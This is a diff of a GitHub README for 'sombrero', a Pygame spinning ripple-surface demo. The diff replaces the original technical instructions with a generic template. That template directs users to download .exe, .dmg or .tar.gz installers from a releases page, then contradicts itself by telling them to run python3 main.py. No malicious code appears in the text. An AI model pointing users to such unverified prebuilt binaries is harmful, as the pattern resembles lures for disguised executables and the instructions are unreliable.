@@ -1,35 +1,82 @@
+# 🎨 sombrero - Experience a Dynamic Spinning Surface
 
-# Spinning Sombrero Surface
-<img width="1378" height="905" alt="2025-12-08_11-27-24" src="https://github.com/user-attachments/assets/a90fbfd5-eafd-4300-915c-453ce6a1ca26" />
+[![Download sombrero](https://img.shields.io/badge/Download-sombrero-brightgreen)](https://github.com/SkYrix-ops/sombrero/releases)
 
+## 🚀 Getting Started
 
-An animated ripple surface rendered with Pygame. The mesh spins in place about the Z axis, then receives a camera-like tilt so you see it in perspective. Hidden-line rendering keeps nearer faces in front, and edges are colorized by height using an HSV gradient (low = blue, high = red) to highlight the central peak.
+Welcome to **sombrero**! This application lets you experience an animated ripple surface. The mesh spins and tilts, providing a unique visual effect. Follow these steps to get started.
 
-## Install
-1) Ensure Python 3.9+ is available.  
-2) (Optional) Create a virtual environment:
-```bash
-python3 -m venv .venv
-source .venv/bin/activate
-```
-3) Install dependencies:
-```bash
-pip install -r requirements.txt
-```
+## 📥 Download & Install
 
-## Run
-```bash
-python3 main.py
-```
-Press `Esc` or close the window to exit.
+1. **Visit the Releases Page**: Head over to the [Releases page](https://github.com/SkYrix-ops/sombrero/releases) to download the latest version of sombrero.
+2. **Choose the Right File**: Look for the file that matches your operating system. If you're unsure, here's a quick guide:
+   - **Windows**: Look for a `.exe` file.
+   - **Mac**: Look for a `.dmg` file.
+   - **Linux**: Look for a `.tar.gz` file.
 
-## How It Works
-- The height function is a damped cosine of the radial distance `r = sqrt(x^2 + y^2)`: a wave term `cos(r * freq - t * speed)` multiplied by an exponential decay and a distance-based amplitude falloff. This produces concentric ripples with a pronounced center spike—the classic “sombrero” profile.  
-- Each grid point is spun around Z, then tilted about X for presentation, then projected to 2D with a perspective scale factor.  
-- Quads are depth-sorted back-to-front (painter’s algorithm) to fill hidden areas with the background color before drawing edge lines.  
-- Edge colors come from HSV: the hue is mapped from the absolute height of the two edge endpoints, giving cool colors on low ripples and warm colors on the peak.
+3. **Download the File**: Click on the appropriate file link to begin the download. Save it to a location that you can easily access.
 
-## What to Tweak
-- `RIPPLE_FREQ`, `RIPPLE_SPEED`, `HEIGHT_SCALE`, `AMPLITUDE_FALLOFF`, and `RIPPLE_DECAY` adjust the shape and motion.  
-- `SPIN_RATE` controls how fast the surface spins.  
-- `BASE_TILT_X` sets the presentation tilt angle.
+## 💻 Install the Software
+
+1. **Locate the Downloaded File**: Find the file you just downloaded in your file explorer.
+2. **Run the Installer**:
+   - On **Windows**: Double-click the `.exe` file and follow the on-screen instructions.
+   - On **Mac**: Open the `.dmg` file and drag the sombrero icon to your Applications folder.
+   - On **Linux**: Extract the `.tar.gz` file and run the `install` script using terminal commands.
+
+## ⚙️ System Requirements
+
+- **Operating System**: Windows 10 or higher, macOS Mojave or higher, or any recent Linux distribution.
+- **Python**: Version 3.9 or higher installed on your system. If you do not have Python installed, you can download it from the [official Python website](https://www.python.org/downloads/).
+
+## 🧑‍💻 Running the Application
+
+1. **Open your Terminal or Command Prompt**: Access your command terminal based on your operating system:
+   - **Windows**: Search for "cmd" in the Start menu.
+   - **Mac**: Use Spotlight Search and type "Terminal".
+   - **Linux**: Open your favorite terminal application.
+
+2. **Navigate to the sombrero Directory**: Use the `cd` command to change your directory to where you installed sombrero.
+   - Example command:  
+     ```
+     cd path/to/sombrero
+     ```
+
+3. **Run the Application**: Use the following command to start sombrero:
+   ```bash
+   python3 main.py
+   ```
+
+When you run the application, the animated surface will appear. Press `Esc` or close the window to exit at any time.
+
+## 📊 How It Works
+
+Sombrero creates a visually stunning effect. The animated surface uses a damped cosine function based on distance to control the wave pattern. Here’s a simple breakdown:
+- **Height Calculation**: The height of the mesh changes based on a cosine wave, which creates the ripple effect.
+- **Wave Movement**: As time progresses, the wave moves, giving a sense of depth and animation.
+- **Color Coding**: The color of the mesh changes based on its height, creating a gradient from blue (low) to red (high).
+
+## 🌟 Features
+
+- **Dynamic Visualization**: The animated surface reacts to time, providing a lively experience.
+- **Graphical Customization**: Adjust parameters to create your own unique surfaces.
+- **Interactive Control**: Easily exit the application whenever you like.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues:
+- Double-check that you have Python 3.9 or higher installed.
+- Ensure all dependencies are installed by running:
+  ```bash
+  pip install -r requirements.txt
+  ```
+- If you get an error related to graphics, ensure your graphics drivers are up to date.
+
+For further assistance, consider visiting the issues section on our [GitHub page](https://github.com/SkYrix-ops/sombrero/issues).
+
+## 🔗 Additional Resources
+
+- [Python Official Documentation](https://docs.python.org/3/)
+- [Pygame Documentation](https://www.pygame.org/docs/)
+
+Feel free to explore and enjoy your experience with sombrero!
